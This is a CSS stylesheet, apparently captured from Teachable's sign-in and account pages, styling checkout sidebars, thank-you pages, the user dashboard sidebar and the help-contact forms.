.devise-layout .content p.text-center a { font-weight: 600; text-decoration: underline; }

.view-school { margin-top: 0px; }

.view-school .resend-code-container { min-height: 40px; text-align: center; }

.view-school .resend-code-button { font-weight: 500; }

.view-school .toast { font-size: 0.889rem; font-weight: 600; line-height: 1.333rem; }

.resend-confirmation-email-button { background: none; border: none; text-decoration: underline; font-weight: 600; color: var(--obsidian); }

.thank-you-header { margin-bottom: 20px; text-align: center; }

.thank-you-header h1 { font-size: 24px; font-weight: 600; padding-top: 4px; }

.thank-you-header p { font-size: 15px; margin-top: 20px; font-weight: 200; line-height: 28px; }

.thank-you-header i.fa.fa-check { background: rgb(38, 173, 127); border-radius: 50%; padding: 8px; font-size: 12px; color: rgb(255, 255, 255); vertical-align: 5px; margin-right: 5px; }

.thank-you-content { margin-top: 30px; margin-bottom: 60px; }

.thank-you-content .course-listing { height: 290px; margin-bottom: 12px; }

.thank-you-content .course-listing .course-box-image-container { margin-left: -15px; margin-right: -15px; }

.thank-you-content .course-listing .course-listing-subtitle, .thank-you-content .course-listing .course-listing-extra-info { display: none; }

.thank-you-content .course-listing .progressbar { display: none; }

.thank-you-content .share-icons { margin-top: 30px; font-size: 17px; color: rgb(163, 163, 163); font-weight: 200; }

.thank-you-content .share-icons a.share-button { vertical-align: -5px; margin-left: 2px; }

.thank-you-content .share-icons a.share-button i.fa { font-size: 30px; }

.thank-you-confirmation-wrapper { background: rgb(255, 255, 255); }

.blocks-page-secure_course_sidebar .list-heading { font-weight: 600; font-size: 16px; line-height: 28px; margin-bottom: 6px; margin-top: 0px; text-align: left; }

.blocks-page-secure_course_sidebar hr { border-top: 0.5px solid rgb(224, 224, 224); margin-top: 30px; margin-bottom: 30px; }

.blocks-page-secure_course_sidebar p, .blocks-page-secure_course_sidebar ul li { font-size: 14px; line-height: 26px; font-weight: 400; color: rgb(88, 111, 111); }

.blocks-page-secure_course_sidebar .block { background: none transparent; padding-top: 0px; padding-bottom: 0px; }

.blocks-page-secure_course_sidebar .block.course_checkout_trust_badge { text-align: center; }

.blocks-page-secure_course_sidebar .block.course_checkout_trust_badge p { text-align: left; margin-bottom: 0px; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial { margin-top: 15px; margin-bottom: 20px; display: flex; padding-right: 15px; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial:last-child { margin-bottom: 0px; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial img.testimonial-photo { margin-top: 0px; width: 60px; height: 60px; border-radius: 50%; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial .testimonial-body { width: 100%; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial .testimonial-quote { margin-top: 0px; width: 20px; height: 15px; margin-left: 15px; display: block; background-size: 20px; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial .testimonial-quote-start { float: left; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/checkout-quote-start.svg"); }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial p { margin-bottom: 10px; padding-left: 40px; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial .testimonial-person { font-size: 13px; line-height: 24px; font-weight: 600; }

.blocks-page-secure_course_sidebar .block.course_checkout_testimonials .checkout-testimonial:last-child { margin-bottom: 0px; }

.blocks-page-secure_course_sidebar .block.course_checkout_bullet_points ul.checkmark-list { list-style: none; margin-left: 0px; margin-top: 15px; margin-bottom: 40px; }

.blocks-page-secure_course_sidebar .block.course_checkout_bullet_points ul.checkmark-list li { color: rgb(9, 165, 154); vertical-align: 14px; font-weight: 600; margin-bottom: 15px; line-height: 25px; margin-left: 0px; }

.blocks-page-secure_course_sidebar .block.course_checkout_bullet_points ul.checkmark-list li::before { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/checkout-checkmark.svg"); background-size: 24px; content: ""; display: inline-block; width: 28px; height: 34px; background-repeat: no-repeat; left: 5px; margin-top: 2px; position: absolute; }

.blocks-page-secure_course_sidebar .block.course_checkout_bullet_points ul.checkmark-list li:last-child { margin-bottom: 0px; }

.cc-form.is-loading { cursor: wait; opacity: 0.65; }

.cc-form.is-inactive { cursor: not-allowed; pointer-events: none; }

.cc-success { color: rgb(52, 107, 54); font-style: italic; font-weight: bold; padding: 20px 0px; }

.blocks-page-post_purchase_page { padding-top: 50px; padding-bottom: 50px; }

.blocks-page-post_purchase_page h1 { font-size: 38px; font-weight: 600; }

.blocks-page-post_purchase_page h2 { margin-bottom: 20px; }

.blocks-page-post_purchase_page h1, .blocks-page-post_purchase_page h2 { margin-top: 0px; }

.blocks-page-post_purchase_page hr { border-top: 0.5px solid rgb(224, 224, 224); margin-top: 50px; margin-bottom: 0px; }

.blocks-page-post_purchase_page p, .blocks-page-post_purchase_page ul li { font-size: 16px; line-height: 26px; font-weight: 300; color: rgb(88, 111, 111); }

.blocks-page-post_purchase_page .row { margin: 0px; }

.blocks-page-post_purchase_page .purchase_confirmation { padding-bottom: 0px; }

.blocks-page-post_purchase_page .upsell_button { padding-top: 0px; }

.blocks-page-post_purchase_page .proceed_to_course_button .btn-block { width: 280px; }

.modal-instant-checkout iframe.instant-checkout-iframe { width: 100%; border: 0px; margin-top: 60px; margin-bottom: 40px; }

.instant-checkout-iframe-body { margin-top: -60px; }

.instant-checkout-iframe-body h1 { font-size: 19px; font-weight: 600; margin-top: 0px; margin-bottom: 20px; color: rgb(43, 54, 54); }

.instant-checkout-iframe-body .change-payment-method { font-size: 12px; margin-left: 10px; color: rgb(133, 146, 166); text-decoration: underline; border: 0px; background: rgb(255, 255, 255); }

.instant-checkout-iframe-body .review-order-box { padding-top: 10px; }

.instant-checkout-iframe-body .payment-method { font-size: 13px; color: rgb(133, 146, 166); }

.instant-checkout-iframe-body .payment-method .payment-method-image { height: 26px; margin-right: 10px; }

.thank-you-header { margin-bottom: 20px; text-align: center; }

.thank-you-header h1 { font-size: 24px; font-weight: 600; padding-top: 4px; }

.thank-you-header p { font-size: 15px; margin-top: 20px; font-weight: 200; line-height: 28px; }

.thank-you-header i.fa.fa-check { background: rgb(38, 173, 127); border-radius: 50%; padding: 8px; font-size: 12px; color: rgb(255, 255, 255); vertical-align: 5px; margin-right: 5px; }

.thank-you-content { margin-top: 30px; margin-bottom: 60px; }

.thank-you-content .course-listing { height: 290px; margin-bottom: 12px; }

.thank-you-content .course-listing .course-box-image-container { margin-left: -15px; margin-right: -15px; }

.thank-you-content .course-listing .course-listing-subtitle, .thank-you-content .course-listing .course-listing-extra-info { display: none; }

.thank-you-content .course-listing .progressbar { display: none; }

.thank-you-content .share-icons { margin-top: 30px; font-size: 17px; color: rgb(163, 163, 163); font-weight: 200; }

.thank-you-content .share-icons a.share-button { vertical-align: -5px; margin-left: 2px; }

.thank-you-content .share-icons a.share-button i.fa { font-size: 30px; }

.thank-you-confirmation-wrapper { background: rgb(255, 255, 255); }

.my-teachable-layout { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; min-width: 330px; background: var(--fog); }

.my-teachable-layout .sidebar { width: 276px; }

.my-teachable-layout .sidebar .profile-card { height: 353px; text-align: center; padding: 30px; }

.my-teachable-layout .sidebar .profile-card .logo-wrapper { position: absolute; left: 0px; top: 22px; padding-left: 30px; }

.my-teachable-layout .sidebar .profile-card .logo-wrapper .logo { display: inline-block; width: 110px; }

.my-teachable-layout .sidebar .profile-card .mobile-settings { position: absolute; right: 20px; top: 27px; display: none; }

.my-teachable-layout .sidebar .profile-card .mobile-settings img { width: 21px; }

.my-teachable-layout .sidebar .profile-card .mobile-logout { font-size: 11px; color: rgba(255, 255, 255, 0.68); text-decoration: underline; margin-top: 0px; display: none; }

.my-teachable-layout .sidebar .profile-card .navbar-toggle { position: absolute; left: 30px; top: 12px; display: none; }

.my-teachable-layout .sidebar .profile-card .navbar-toggle .icon-bar { background: rgb(255, 255, 255); }

.my-teachable-layout .sidebar .profile-card .mobile-navbar { background: rgb(255, 255, 255); height: 279px; left: 0px; padding-left: 30px; position: absolute; text-align: left; top: 74px; transition: all 0.2s ease-in 0s; width: 100%; z-index: 1000; }

.my-teachable-layout .sidebar .profile-card .mobile-navbar .navbar-nav { margin-top: 14px; }

.my-teachable-layout .sidebar .profile-card .mobile-navbar .navbar-nav a { font-weight: 600; color: rgb(143, 157, 165); }

.my-teachable-layout .sidebar .profile-card .mobile-navbar .navbar-nav a:hover { color: rgb(9, 165, 154); background: none; }

.my-teachable-layout .sidebar .profile-card .user-info { margin-top: 40px; }

.my-teachable-layout .sidebar .profile-card .user-info h2 { font-size: 16px; font-weight: 500; }

.my-teachable-layout .sidebar .profile-card .user-info p { font-size: 13px; line-height: 1; }

.my-teachable-layout .sidebar .profile-card .avatar { padding: 5px; border: 1px solid rgb(204, 204, 204); margin-top: 30px; border-radius: 50%; display: inline-block; }

.my-teachable-layout .sidebar .nav-sidebar { padding: 20px 30px; }

.my-teachable-layout .sidebar .nav-sidebar > li { background-repeat: no-repeat; background-position: 5px 16px; background-size: 50px; cursor: pointer; }

.my-teachable-layout .sidebar .nav-sidebar > li a { padding-right: 0px; margin-left: 30px; text-transform: uppercase; font-weight: 500; font-size: 13px; color: rgb(133, 146, 166); line-height: 35px; background: rgb(255, 255, 255); }

.my-teachable-layout .sidebar .nav-sidebar > li a:focus { background: rgb(255, 255, 255) !important; }

.my-teachable-layout .sidebar .nav-sidebar > li:hover, .my-teachable-layout .sidebar .nav-sidebar > li:focus, .my-teachable-layout .sidebar .nav-sidebar > li.selected { background-position: -24px 16px; }

.my-teachable-layout .sidebar .nav-sidebar > li:hover a, .my-teachable-layout .sidebar .nav-sidebar > li:focus a, .my-teachable-layout .sidebar .nav-sidebar > li.selected a { color: rgb(255, 127, 69); }

.my-teachable-layout .sidebar .nav-sidebar > li.selected a { font-weight: 600; }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-profile { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-school.svg"); }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-create { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-plus.svg"); }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-settings { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-settings.svg"); }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-help { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-help.svg"); }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-billing { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/my-teachable/icons/icon-billing.svg"); }

.my-teachable-layout .sidebar .nav-sidebar > li.nav-item-logout { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-logout.svg"); }

@media (max-width: 767px) {
  .my-teachable-layout .sidebar { width: 100%; }
  .my-teachable-layout .sidebar .nav-sidebar { margin-right: 0px; }
}

@media (min-width: 767px) {
  .my-teachable-layout .sidebar { position: fixed; top: 0px; bottom: 0px; left: 0px; padding: 0px; z-index: 1000; display: block; overflow: hidden auto; background-color: rgb(255, 255, 255); border-right: 1px solid rgb(238, 238, 238); }
  .my-teachable-layout .sidebar .navbar-collapse.collapse.mobile-navbar { display: none !important; }
  .my-teachable-layout .sidebar .sticky-center-container { transform: translate(calc(-50% + 137px), -50%); }
}

@media screen and (max-width: 767px) {
  .my-teachable-layout .sidebar .logo-wrapper { display: none; }
  .my-teachable-layout .sidebar .profile-card { background-position: 0px 95%; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/teachable-bg.svg"); }
  .my-teachable-layout .sidebar .profile-card h2, .my-teachable-layout .sidebar .profile-card p { color: rgb(255, 255, 255); }
  .my-teachable-layout .sidebar .profile-card .navbar-toggle { display: block; }
  .my-teachable-layout .sidebar .profile-card .mobile-settings, .my-teachable-layout .sidebar .mobile-logout { display: block; }
  .my-teachable-layout .sidebar .nav-sidebar { display: none; }
}

.my-teachable-layout .my-teachable-dashboard { padding: 20px; height: 100%; position: relative; width: 100%; }

.my-teachable-layout .my-teachable-dashboard .sticky-center-container { margin-left: 137px; }

.my-teachable-layout .my-teachable-dashboard h1 { padding-left: 5px; font-size: 17px; font-weight: 600; margin-bottom: 33px; color: rgb(51, 53, 58); }

.my-teachable-layout .my-teachable-dashboard #form-confirmation.alert-warning { background-color: var(--vanilla-wafer); border: 1px solid var(--buttermilk); border-radius: 4px; }

.my-teachable-layout .my-teachable-dashboard #form-confirmation .confirmation-text { color: var(--obsidian); font-weight: normal; }

.my-teachable-layout .my-teachable-dashboard #form-confirmation .confirmation-text span, .my-teachable-layout .my-teachable-dashboard #form-confirmation .confirmation-text a { font-weight: bold; }

.my-teachable-layout .my-teachable-dashboard #form-confirmation .confirmation-text a { color: var(--obsidian); }

@media screen and (max-width: 767px) {
  .my-teachable-layout .my-teachable-dashboard .sticky-center-container { margin-left: 0px; }
}

@media screen and (min-width: 768px) and (max-width: 930px) {
  .my-teachable-layout .my-teachable-dashboard .sticky-center-container { margin-top: 0px; width: calc(100% - 275px); }
}

@media screen and (min-width: 768px) {
  .my-teachable-layout .my-teachable-dashboard { position: absolute; padding-right: 50px; padding-top: 28px; padding-left: 325px; }
}

.my-teachable-layout .sticky-center-container { position: absolute; top: 50%; width: 550px; left: 50%; }

.my-teachable-layout .sticky-center-container .settings-form-wrapper a { text-decoration: underline; cursor: pointer; }

.my-teachable-layout .sticky-center-container .content-box { width: 100%; margin-bottom: 0px; border: 0px !important; }

.my-teachable-layout .sticky-center-container .content-box p.center-explanation { font-size: 14px; max-width: 400px; font-weight: 500; line-height: 22px; margin-bottom: 10px; color: var(--nebulous); }

.my-teachable-layout .sticky-center-container .content-box a.link-below-button { display: block; margin-top: 32px; color: var(--nebulous); font-size: 12px; font-weight: 500; text-decoration: underline; }

.my-teachable-layout .sticky-center-container .content-box .button-group { margin-top: 45px; display: block; }

@media screen and (max-width: 767px) {
  .my-teachable-layout .sticky-center-container { width: 100%; border-radius: 0px; transform: none; top: 0px; left: 0px; margin-top: -20px; border-top: 1px solid var(--fog); margin-bottom: 0px; }
  .my-teachable-layout .sticky-center-container.pinned { transform: none; margin-top: -1px; position: absolute; top: 0%; left: 0%; }
  .my-teachable-layout .sticky-center-container .content-box { box-shadow: none; border-radius: 0px; min-height: 100%; margin-left: 0px; }
  .my-teachable-layout .my-teachable-center { padding: 0px; }
  .my-teachable-layout .my-teachable-center .sticky-center-container { border-radius: 0px; }
}

@media screen and (min-width: 768px) and (max-width: 930px) {
  .my-teachable-layout .sticky-center-container.pinned { transform: translate(-50%, 0%); top: 0%; }
}

@media screen and (min-width: 768px) {
  .my-teachable-layout .sticky-center-container { width: 550px; transform: translate(-50%, -50%); }
  .my-teachable-layout .sticky-center-container.pinned { transform: translate(-50%, 0%); top: 0%; }
}

.my-teachable-layout .content-box select { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/select-up-down.png") right 12px center no-repeat rgb(255, 255, 255); }

.my-teachable-layout .wide-sticky-center-wrapper { padding-left: 0px; top: 0px; height: 100%; }

.my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar { position: absolute; height: 100%; left: 0px; z-index: 1000; background: rgb(255, 255, 255); border-right: 1px solid rgb(239, 239, 245); border-top-left-radius: 6px; border-bottom-left-radius: 6px; width: 383px; }

.my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar__img { position: absolute; height: 288px; width: 194px; top: 0px; left: 0px; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/admin/assets/images/onboarding-survey-bg.svg"); background-size: cover; background-repeat: no-repeat; }

.my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar__text-wrapper { position: absolute; top: 32%; left: 0px; right: 0px; z-index: 100; }

.my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar__text-wrapper__password { padding: 0px 16px; line-height: 1.4; }

.my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar h2 { color: rgb(30, 35, 39); text-align: center; margin: 0px; font-size: 20px; font-weight: 600; }

@media screen and (min-width: 0px) and (max-width: 930px) {
  .my-teachable-layout .wide-sticky-center-wrapper { position: relative; margin-top: 0px; }
  .my-teachable-layout .wide-sticky-center-wrapper .sticky-center-container { margin-top: -1px; top: 0%; }
  .my-teachable-layout .wide-sticky-center-wrapper.create-school-wrapper .brand-sidebar { height: 220px; }
  .my-teachable-layout .wide-sticky-center-wrapper.create-school-wrapper .brand-sidebar__text-wrapper { top: 26%; }
  .my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar { width: 100%; position: relative; min-height: 100px; border-radius: 0px; border-right: none; border-bottom: 1px solid rgb(239, 239, 245); }
  .my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar__img { display: none; }
  .my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar__text-wrapper { top: 40%; }
  .my-teachable-layout .wide-sticky-center-wrapper .brand-sidebar > h2 { margin-top: 0px; padding-top: 40px; padding-bottom: 40px; margin-bottom: 0px; }
}

@media screen and (min-width: 931px) {
  .my-teachable-layout .wide-sticky-center-wrapper .sticky-center-container { width: 930px; padding-left: 378px; }
  .my-teachable-layout .wide-sticky-center-wrapper .sticky-center-container .content-box { min-height: 300px; }
}

.my-teachable-layout .content-box-main { text-align: center; }

.my-teachable-layout .tickets-app-container { min-height: 100%; }

.my-teachable-layout .contact-header { position: absolute; top: 28px; width: 550px; right: 30px; text-align: right; }

@media screen and (max-width: 767px) {
  .my-teachable-layout .contact-header { position: static; width: 100%; text-align: center; padding-left: 15px; }
  .my-teachable-layout .contact-header .contact-header-section { display: inline-block; user-select: none; float: none !important; }
}

.my-teachable-layout .contact-header .contact-header-section { padding-left: 5%; text-align: left; float: right; position: relative; }

.my-teachable-layout .contact-header .contact-header-section .contact-header-link { text-transform: uppercase; color: rgb(133, 146, 166); font-weight: 500; }

.my-teachable-layout .contact-header .contact-header-section .contact-header-link:hover { color: rgb(105, 120, 143); }

.my-teachable-layout .contact-header .badge { background: rgb(213, 81, 138); margin-left: 5px; padding: 4px 11px; vertical-align: 1px; }

.my-teachable-layout .contact-header #HW_badge_cont { background: rgb(213, 81, 138); margin-left: 5px; padding: 4px 11px; font-size: 12px; height: 20px; font-weight: 700; border-radius: 22px; vertical-align: 1px; float: right; display: inline !important; }

.my-teachable-layout .contact-header #HW_badge { margin-top: -6px; }

.my-teachable-layout .contact-popover { background: rgb(255, 255, 255); position: absolute; border-radius: 5px; width: 500px; right: -11px; top: 34px; border: 1px solid rgb(224, 224, 224); box-shadow: rgb(227, 231, 234) 0px 8px 20px; transition: transform 0.4s cubic-bezier(0.23, 1.5, 0.32, 1) 0s, opacity 0.5s cubic-bezier(0.23, 1.5, 0.32, 1) 0s, -webkit-transform 0.4s cubic-bezier(0.23, 1.5, 0.32, 1) 0s; transform-origin: 99% 0%; z-index: 1; }

@media (max-width: 767px) {
  .my-teachable-layout .contact-popover { left: 0px; position: fixed; top: 0px; margin: 5% !important; width: 90% !important; }
  .my-teachable-layout .contact-popover::before { background: rgb(255, 255, 255); border-radius: 50%; box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 4px; font-size: 22px; line-height: 19px; text-align: center; z-index: 1; border: none !important; content: "×" !important; height: 20px !important; width: 20px !important; }
}

.my-teachable-layout .contact-popover.show-popover { opacity: 1; transform: scale(1); }

.my-teachable-layout .contact-popover.hide-popover { opacity: 0; transform: scale(0); }

.my-teachable-layout .contact-popover::before { width: 0px; height: 0px; border-left: 7px solid transparent; border-right: 7px solid transparent; border-bottom: 7px solid rgb(224, 224, 224); content: ""; position: absolute; right: 17px; margin-top: -8px; display: inline-block; }

.my-teachable-layout .contact-popover::after { width: 0px; height: 0px; border-left: 7px solid transparent; border-right: 7px solid transparent; border-bottom: 7px solid rgb(255, 255, 255); content: ""; position: absolute; right: 17px; top: 1px; margin-top: -7px; display: inline-block; }

.my-teachable-layout .contact-popover .section-title { text-transform: uppercase; font-weight: 800; font-size: 13px; color: rgb(106, 114, 125); padding-left: 20px; border-bottom: 1px solid rgb(228, 235, 245); margin-bottom: 0px; padding-bottom: 18px; }

.my-teachable-layout .contact-popover .popover-item-list { margin-top: 7px; margin-bottom: 7px; }

.my-teachable-layout .contact-popover .popover-item-list .popover-item { display: block; padding: 10px 20px; margin-bottom: 0px; cursor: pointer; }

.my-teachable-layout .contact-popover .popover-item-list .popover-item:hover { background: rgb(245, 245, 245); }

.my-teachable-layout .contact-popover .popover-item-list .popover-item .popover-item-title { color: rgb(9, 165, 154); font-size: 13px; font-weight: 600; }

.my-teachable-layout .contact-popover .popover-item-list .popover-item .popover-item-title.see-all { color: rgb(122, 151, 165); font-size: 11px; }

.my-teachable-layout .contact-popover .popover-item-list .popover-item .popover-item-description { font-size: 12px; margin-top: 1px; line-height: 19px; color: rgb(144, 144, 144); }

.my-teachable-layout .contact-main { background-color: rgb(245, 246, 247); }

.my-teachable-layout .contact-main.ng-enter { transition: all 0.5s ease 0s; opacity: 0; }

.my-teachable-layout .contact-main.ng-enter-active { opacity: 1; }

.my-teachable-layout .contact-main .back-caret { font-size: 12px; left: 320px; display: block; top: 30px; position: absolute; text-transform: uppercase; color: rgb(117, 130, 150); font-weight: 600; }

.my-teachable-layout .contact-main .back-caret i { font-size: 17px; vertical-align: -1px; margin-right: 3px; }

.my-teachable-layout .contact-main .back-caret:hover { color: rgb(71, 80, 94); }

@media screen and (max-width: 767px) {
  .my-teachable-layout .contact-main .back-caret { display: none; }
}

.my-teachable-layout .contact-main h2 { font-size: 36px; font-weight: 500; text-align: center; margin-top: 120px; }

.my-teachable-layout .contact-main p.description { text-align: center; font-size: 15px; line-height: 25px; font-weight: 400; color: rgb(82, 86, 90); max-width: 620px; margin: auto; }

.my-teachable-layout .contact-main p.subtitle { text-align: center; }

.my-teachable-layout .contact-main .banner { margin: 40px auto 30px; display: block; background-position: center center; background-repeat: no-repeat; height: 150px; background-size: 350px; }

.my-teachable-layout .contact-main .banner.banner-people { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/bg/background-form-people.svg"); }

.my-teachable-layout .contact-main .banner.banner-support { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/illustrations/illustration-support.svg"); }

.my-teachable-layout .contact-main .banner.ng-enter { transition: all 0.5s ease 0s; opacity: 0; }

.my-teachable-layout .contact-main .banner.ng-enter-active { opacity: 1; }

.my-teachable-layout .contact-main .ticket-type-disclaimer { text-align: center; font-size: 11px; line-height: 21px; font-weight: 600; max-width: 600px; color: rgb(95, 191, 183); background: rgb(238, 251, 248); padding: 15px; border-radius: 4px; border: 1px solid rgb(180, 215, 213); margin-right: auto; margin-bottom: auto; margin-left: auto; margin-top: 20px !important; }

.my-teachable-layout .contact-main .ticket-type-disclaimer .hours { font-size: 13px; margin-top: 4px; padding-bottom: 7px; margin-bottom: 6px; border-bottom: 1px dashed rgb(180, 214, 212); color: rgb(70, 133, 127); }

.my-teachable-layout .contact-main .ticket-type-disclaimer .hours-except { color: rgb(159, 181, 181); }

.my-teachable-layout .contact-main .form-control.search-box { padding-left: 25px; font-size: 13px; border-color: rgb(224, 224, 224); background-position: calc(100% - 18px) 14px; background-size: 19px; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-magnifying-glass.svg"); background-repeat: no-repeat; width: calc(100% - 20px); margin-left: 10px; margin-bottom: 40px; border-radius: 30px; height: 50px; }

.my-teachable-layout .contact-main .form-control.search-box:focus { border-color: rgb(175, 175, 175); }

.my-teachable-layout .contact-main .help-categories { max-width: 1024px; margin: 40px auto auto; }

.my-teachable-layout .contact-main .help-categories.ng-enter { transition: all 0.5s ease 0s; opacity: 0; }

.my-teachable-layout .contact-main .help-categories.ng-enter-active { opacity: 1; }

.my-teachable-layout .contact-main .help-categories .help-category-row { display: flex; -webkit-box-pack: center; justify-content: center; position: relative; }

.my-teachable-layout .contact-main .help-categories .help-category-row .contact-popover { z-index: 1000; margin-top: 25px; width: calc(100% - 27px); right: 15px; }

.my-teachable-layout .contact-main .help-categories .help-category-row .contact-popover .section-title { text-align: left; margin-top: 20px; }

.my-teachable-layout .contact-main .help-categories .help-category-row .contact-popover .popover-item-list { padding-left: 0px; }

.my-teachable-layout .contact-main .help-categories .help-category-row .contact-popover .popover-item-list .popover-item { font-size: 13px; }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category { cursor: pointer; width: 46%; margin-left: 2%; margin-right: 2%; margin-bottom: 40px; min-height: 150px; border-radius: 5px; background: rgb(255, 255, 255); display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; padding: 38px; box-shadow: rgb(230, 233, 236) 0px 10px 21px 0px; transition: all 0.15s ease-in 0s; text-align: center; -webkit-box-align: center; align-items: center; }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category.ng-enter { transition: all 0.5s ease 0s; opacity: 0; }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category.ng-enter-active { opacity: 1; }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category .category-image { display: block; margin-bottom: 25px; width: 56px; }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category .category-title { font-size: 15px; line-height: 20px; display: block; font-weight: 600; margin-bottom: 10px; color: rgb(33, 35, 56); }

.my-teachable-layout .contact-main .help-categories .help-category-row .help-category .category-description { color: rgb(107, 109, 124); line-height: 21px; font-size: 13px; font-weight: 300; display: block; }

@media screen and (min-width: 768px) {
  .my-teachable-layout .contact-main .help-categories .help-category-row .article-search-input { width: 80%; }
}

.my-teachable-layout .contact-main .help-categories .help-category-row a.help-category:hover { border-color: rgb(255, 127, 69); box-shadow: rgba(50, 50, 93, 0.12) 0px 30px 100px, rgba(50, 50, 93, 0.1) 0px 10px 20px; border-width: 2px; }

.my-teachable-layout .contact-main .help-categories .help-category-row a.help-category:hover .category-title { color: rgb(9, 165, 154); }

@media screen and (max-width: 767px) {
  .my-teachable-layout .contact-main .help-categories .help-category-row { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
  .my-teachable-layout .contact-main .help-categories .help-category-row .help-category { width: 97%; }
}

.my-teachable-layout .contact-main .help-categories .help-category-row .help-block { color: rgb(169, 68, 66); font-weight: bold; font-size: 12px; }

.my-teachable-layout .contact-main .contact-form-success { margin-top: 80px; padding: 60px 40px; text-align: center; border: 0px; }

.my-teachable-layout .contact-main .contact-form { margin: 30px auto; max-width: 600px; text-align: left; box-shadow: rgb(227, 231, 234) 0px 8px 20px; background: rgb(255, 255, 255); border-radius: 4px; }

.my-teachable-layout .contact-main .contact-form .form-group { padding: 18px 30px; border-bottom: 1px solid rgb(226, 226, 226); margin-bottom: 0px; }

.my-teachable-layout .contact-main .contact-form .form-group.ng-enter { transition: all 0.5s ease 0s; opacity: 0; }

.my-teachable-layout .contact-main .contact-form .form-group.ng-enter-active { opacity: 1; }

.my-teachable-layout .contact-main .contact-form .form-group.form-group-prompt { font-weight: 700; padding-top: 20px; color: rgb(67, 77, 93); padding-bottom: 19px; }

.my-teachable-layout .contact-main .contact-form .form-group.form-group-prompt p { margin-bottom: 0px; font-weight: 600; }

.my-teachable-layout .contact-main .contact-form .form-group.form-group-prompt, .my-teachable-layout .contact-main .contact-form .form-group.schema-form-message-us, .my-teachable-layout .contact-main .contact-form .form-group.schema-form-submit { background: rgb(251, 251, 251); }

.my-teachable-layout .contact-main .contact-form .form-group.schema-form-message-us { padding-bottom: 30px; }

.my-teachable-layout .contact-main .contact-form .form-group.schema-form-submit { padding: 30px; }

.my-teachable-layout .contact-main .contact-form .form-group.schema-form-submit a, .my-teachable-layout .contact-main .contact-form .form-group.schema-form-message-us a { text-decoration: none; }

.my-teachable-layout .contact-main .contact-form .form-group .control-label, .my-teachable-layout .contact-main .contact-form .form-group label { color: rgb(71, 80, 94); font-weight: 500; line-height: 29px; font-size: 13px; }

.my-teachable-layout .contact-main .contact-form .form-group span.glyphicon { display: none; }

.my-teachable-layout .contact-main .contact-form .form-group .form-control, .my-teachable-layout .contact-main .contact-form .form-group select { margin-bottom: 7px; line-height: 25px; font-size: 13px; }

.my-teachable-layout .contact-main .contact-form .form-group .form-control:focus, .my-teachable-layout .contact-main .contact-form .form-group select:focus { box-shadow: none; border: 1px solid rgb(148, 148, 148) !important; }

.my-teachable-layout .contact-main .contact-form .form-group .control-input { font-size: 13px; line-height: 21px; }

.my-teachable-layout .contact-main .contact-form .form-group .control-input .img-circle { float: left; width: 45px; margin-right: 17px; }

.my-teachable-layout .contact-main .contact-form .form-group p, .my-teachable-layout .contact-main .contact-form .form-group ul li { font-size: 13px; font-weight: 500; line-height: 26px; }

.my-teachable-layout .contact-main .contact-form .form-group .fa { margin-right: 5px; }

.my-teachable-layout .contact-main .contact-form .form-group a { text-decoration: underline; font-weight: bold; }

.my-teachable-layout .contact-main .contact-form .form-group-success { background: rgb(247, 255, 253); }

.my-teachable-layout .contact-main .contact-form .form-group-success .control-label { color: rgb(43, 134, 127); line-height: 24px; margin-bottom: 3px; font-size: 13px; font-weight: 800; }

